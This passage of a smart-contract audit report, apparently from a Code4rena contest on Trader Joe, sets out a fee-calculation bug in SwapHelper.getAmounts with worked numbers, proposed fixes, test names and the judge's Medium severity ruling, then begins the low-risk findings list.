href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65\">SwapHelper.getAmounts</a> carries most of the blame for this error.</p>\n<p>3 main causes have been identified and will be discussed in this report.</p>\n<ul>\n<li>Incorrect use of getFeeAmountFrom</li>\n<li>Incorrect conditional for amountIn overflow</li>\n<li>Need for an additional FeeHelper function</li>\n</ul>\n<h4 id=\"affected-contracts-and-libraries\" style=\"position:relative;\"><a href=\"#affected-contracts-and-libraries\" aria-label=\"affected contracts and libraries permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Affected contracts and libraries</h4>\n<ul>\n<li>\n<p>LBPair.sol</p>\n<ul>\n<li><a href=\"https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L304-L330\">swap</a></li>\n</ul>\n</li>\n<li>\n<p>LBRouter.sol</p>\n<ul>\n<li><a href=\"https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125\">getSwapIn</a></li>\n<li><a href=\"https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L168-L169\">getSwapOut</a></li>\n</ul>\n</li>\n<li>\n<p>SwapHelper.sol</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65\">getAmounts</a></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"proposed-changes\" style=\"position:relative;\"><a href=\"#proposed-changes\" aria-label=\"proposed changes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proposed changes</h4>\n<ul>\n<li>\n<p>FeeHelper.sol</p>\n<ul>\n<li><a href=\"https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/libraries/FeeHelper.sol#L164-L173\">getAmountInWithFees</a> ( <strong><em>New</em></strong> )</li>\n</ul>\n</li>\n<li>\n<p>SwapHelper.sol</p>\n<ul>\n<li><a href=\"https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/src/libraries/SwapHelper.sol#L118-L126\">getAmountsV2</a> ( <strong><em>New</em></strong> )</li>\n</ul>\n</li>\n<li>\n<p>LBRouter.sol</p>\n<ul>\n<li><a href=\"https://github.com/sha256yan/incorrect-fee/blob/716cddf2583da86674376cb5346bf46b701b242c/test/mocks/correctFee/LBRouterV2.sol#L124-L125\">getSwapIn</a> ( <strong><em>Modified</em></strong> )</li>\n<li><a href=\"https://github.com/sha256yan/incorrect-fee/blob/c1719b8429c7d25e4e12fc4632842285a2eaaf8b/test/mocks/correctFee/LBRouterV2.sol#L168-L169\">getSwapOut</a> ( <strong><em>Modified</em></strong> )</li>\n</ul>\n</li>\n<li>\n<p>LBPair.sol</p>\n<ul>\n<li><a href=\"https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/test/mocks/correctFee/LBPair.sol#L332-L333\">swap</a>  ( <strong><em>Modified</em></strong> )</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"details\" style=\"position:relative;\"><a href=\"#details\" aria-label=\"details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Details</h4>\n<ul>\n<li>As mentioned earlier, most issues arise from <code>SwapHelper.getAmounts</code>. The SwapHelper library is often used for the Bin type. (<a href=\"https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L36\">Example in LBPair</a>). The proposed solution includes the new functions <a href=\"https://github.com/sha256yan/incorrect-fee/blob/48b5caee818c1befb5733c3f96e415ca14a67bf2/src/libraries/SwapHelper.sol#L76-L133\">SwapHelper.getAmountsV2</a> and <a href=\"https://github.com/sha256yan/incorrect-fee/blob/48b5caee818c1befb5733c3f96e415ca14a67bf2/src/libraries/FeeHelper.sol#L164-L173\">FeeHelper.getAmountInWithFees</a>.</li>\n<li>LBPair.swap uses <code>_bin.getAmounts(...)</code> on the active bin to calculate fees. (<a href=\"https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L329-L330\">See here</a>)</li>\n<li>Inside of <code>SwapHelper.getAmounts</code>, for a given swap, if a bin has enough liqudity, the fee is calculated using (<a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L65\">FeeHelper.getFeeAmountFrom</a>). This results in smaller than expected fees.</li>\n<li><code>LBRouter.getSwapOut</code> relies on <code>SwapHelper.getAmounts</code> to simulate swaps. Its simulations adjust to the correct fee upon using <code>SwapHelper.getAmountsV2</code> (<a href=\"https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125\">LBRouter.getSwapOut</a>, <a href=\"\">SwapHelper.getAmounts</a>, <a href=\"\">SwapHelper.getAmountsV2</a>)</li>\n<li><code>LBRouter.getSwapIn</code> has a fee calculation error which is independent of <code>SwapHelper.getAmounts</code>. (<a href=\"https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L168-L169\">See here</a>)</li>\n<li>As of right now the <code>LBPair.swap</code> using getAmountsV2 uses <code>3.8%</code> <strong><em>more</em></strong> gas.</li>\n</ul>\n<p><img src=\"https://user-images.githubusercontent.com/91401566/197410772-e3f1cb99-7181-48f7-a56a-2430176a92ff.png\" alt=\"LBPair comparison\"></p>\n<h3 id=\"incorrect-use-of-getfeeamountfrom\" style=\"position:relative;\"><a href=\"#incorrect-use-of-getfeeamountfrom\" aria-label=\"incorrect use of getfeeamountfrom permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Incorrect use of getFeeAmountFrom</h3>\n<ul>\n<li>When there is enough liquidity in a bin for a swap, we should use <code>FeeHelper.getFeeAmount(amountIn)</code> instead of <code>FeeHelper.getFeeAmountFrom(amountIn)</code>.</li>\n</ul>\n<h4 id=\"evidence\" style=\"position:relative;\"><a href=\"#evidence\" aria-label=\"evidence permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Evidence</h4>\n<ul>\n<li>amountIn, the parameter passed to calculate fees, is the amount of tokens in the LBPair contract in excess of the reserves and fees of the pair for that token. <a href=\"https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/LBPair.sol#L312-L314\">Inside LBPair.sol</a> - <a href=\"https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/TokenHelper.sol#L59-L69\">Inside TokenHelper</a></li>\n</ul>\n<p>Will now use example numbers:</p>\n<ul>\n<li>Let amountIn = 1e10 (meaning the user has transferred/minted 1e10 tokens to the LBPair)</li>\n<li>Let PRECISION = 1e18</li>\n<li>Let totalFee =  0.00125 x precision (fee of 0.0125%)</li>\n<li>Let price = 1 (parity)</li>\n<li>If the current bin has enough liqudity, feeAmount must be: (amountIn * totalFee ) / (PRECISION) = 12500000</li>\n<li><a href=\"https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/FeeHelper.sol#L124-L126\">FeeHelper.getFeeAmountFrom(amountIn)</a> uses the formula: feeAmount = (amountIn * totalFee) / (PRECISION + totalFee) = 12484394</li>\n<li><a href=\"https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/FeeHelper.sol#L116-L118\">FeeHelper.getFeeAmount(amountIn)</a> uses exactly the formula ourlined in the correct feeAmount calculation and is the correct method in this case.</li>\n<li>Visit the tests section to run a test.</li>\n</ul>\n<h3 id=\"incorrect-condition-for-amountin-overflow\" style=\"position:relative;\"><a href=\"#incorrect-condition-for-amountin-overflow\" aria-label=\"incorrect condition for amountin overflow permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Incorrect condition for amountIn overflow</h3>\n<ul>\n<li>The <a href=\"https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/src/libraries/SwapHelper.sol#L61\">condition</a> for when an amountIn overflows the maximum amount available in a bin is flawed.</li>\n<li>The Fee Deficit here could potentially trigger an unnecessary bin de-activation.</li>\n</ul>\n<h4 id=\"evidence-1\" style=\"position:relative;\"><a href=\"#evidence-1\" aria-label=\"evidence 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Evidence</h4>\n<p><strong>Snippet 1 (SwapHelper.getAmounts)</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        fees = fp.getFeeAmountDistribution(fp.getFeeAmount(_maxAmountInToBin));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_maxAmountInToBin + fees.total &lt;= amountIn) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            //do things</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span></code></pre>\n<ul>\n<li>Collecting the fees on <code>_maxAmountInToBin</code> before doing so on <code>amountIn</code> means we are not checking  to see whether <code>amountIn</code> after</li>\n</ul>\n<p>Consider the following:</p>\n<p><strong>Snippet 2 (SwapHelper.getAmountsV2)</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        fees = fp.getFeeAmountDistribution(fp.getFeeAmount(amountIn));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_maxAmountInToBin &lt;  amountIn - fees.total) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            //do things</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span></code></pre>\n<ul>\n<li>Now, the fees are collected on <code>amountIn</code>.</li>\n<li>Assuming both conditions are true, the fees from Snippet2 will be necessarily larger than those in Snippet1 since in both cases <code>_maxAmountInToBin &#x3C; amountIn</code>.</li>\n<li>Snippet 1 produces false positives. Meaning, SwapHelper.getAmounts changes its active bin id more than needed. (See Tests section at the bottom for the relevant test)</li>\n</ul>\n<h3 id=\"need-for-an-additional-feehelper-function\" style=\"position:relative;\"><a href=\"#need-for-an-additional-feehelper-function\" aria-label=\"need for an additional feehelper function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Need for an additional FeeHelper function</h3>\n<ul>\n<li>There are currently functions to answer the following question: How many tokens must a user send, to end up with a given amountInToBin after fees, before the swap itself takes place?</li>\n</ul>\n<h4 id=\"evidence-2\" style=\"position:relative;\"><a href=\"#evidence-2\" aria-label=\"evidence 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Evidence</h4>\n<ul>\n<li>\n<p><code>LBRouter.getSwapIn(, amountOut, )</code> needs this question answered. At a given price, how many tokens must a user send, to receive <code>amountOut</code>?</p>\n<ul>\n<li>We use the <code>amountOut</code> and price to work backwards to the <code>amountInToBin</code>.</li>\n<li>Current approach calculates fees on <code>amountInToBin</code>. (<a href=\"https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125\">See here</a>)</li>\n<li>This is incorrect as fees should be calculated on <code>amountIn</code>. (As we discussed in <a href=\"#incorrect-use-of-getfeeamountfrom\">Incorrect use of getFeeAmountFrom</a>)</li>\n</ul>\n</li>\n<li>SwapHelper.getAmounts needs to know what hypothetical <code>amountIn</code> would end up as <code>maxAmountInToBin</code> after fees. This is needed to be able to avoid <a href=\"#incorrect-conditional-for-amountin-overflow\">Incorrect amountIn overflow</a></li>\n</ul>\n<h4 id=\"install-dependencies\" style=\"position:relative;\"><a href=\"#install-dependencies\" aria-label=\"install dependencies permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Install dependencies</h4>\n<p>To install dependencies, run the following to install dependencies:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge install</span></span></code></pre>\n<h4 id=\"tests\" style=\"position:relative;\"><a href=\"#tests\" aria-label=\"tests permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tests</h4>\n<p>To run tests, run the following command:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test --match-contract Report -vv</span></span></code></pre>\n<h4 id=\"testsinglebinswapfeedifference\" style=\"position:relative;\"><a href=\"#testsinglebinswapfeedifference\" aria-label=\"testsinglebinswapfeedifference permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>testSingleBinSwapFeeDifference:</h4>\n<ul>\n<li>Simple test to show the Fee Defecit in it’s most basic form.</li>\n</ul>\n<h4 id=\"testfalsepositivebindeactivation\" style=\"position:relative;\"><a href=\"#testfalsepositivebindeactivation\" aria-label=\"testfalsepositivebindeactivation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>testFalsePositiveBinDeactivation</h4>\n<ul>\n<li>Test that shows false positive resulting from the <a href=\"#incorrect-conditional-for-amountin-overflow\">Incorrect condition</a></li>\n</ul>\n<h4 id=\"testcorrectfeebindeactivation\" style=\"position:relative;\"><a href=\"#testcorrectfeebindeactivation\" aria-label=\"testcorrectfeebindeactivation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>testCorrectFeeBinDeactivation</h4>\n<ul>\n<li>Test that shows with getAmountsV2 the false positive issue is resolved.</li>\n</ul>\n<h4 id=\"testmultibingrowth\" style=\"position:relative;\"><a href=\"#testmultibingrowth\" aria-label=\"testmultibingrowth permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>testMultiBinGrowth</h4>\n<ul>\n<li>Generates datapoints used in opening graph.</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/470\">0x0Louis (Trader Joe) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/470#issuecomment-1313772620\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown an incorrect application of the fee formula, which results in an exponentially growing reduction in fees taken.</p>\n<p>While the report is thorough, the maximum impact is a loss of up to <code>2%</code> of the total fees (<code>98%</code> of fees are collected).</p>\n<p>Because of the reduced order of magnitude for the impact, I think the appropriate severity to be Medium as the finding will cause a loss of yield as shown by the Warden.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 11 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/334\">report highlighted below</a> by <strong>zzykxx</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/477\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/475\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/446\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/342\">pashov</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/325\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/280\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/186\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/177\">KingNFT</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/153\">0x1f8b</a>, and <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/142\">Rolezn</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<p>[L-01]  Missing sanity checks on <code>to</code> addresses in <code>LBRouter.sol</code><br>\n[L-02]  Potential loss of funds on tokens with big supplies<br>\n[L-03]  In <code>TokenHelper.sol</code> the <code>safeTransfer</code> function does not check for potentially self-destroyed tokens<br>\n[L-04] <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/309\">Excess amount returned to flashloan is not sent back</a><br>\n[L-05] <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/310\">It’s possible to pay a lower fee than expected for a flashloan</a><br>\n[L-06] <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/311\">Rebasing tokens are not compatible with the protocol</a><br></p>\n<h2 id=\"l-01-missing-sanity-checks-on-to-addresses-in-lbroutersol\" style=\"position:relative;\"><a 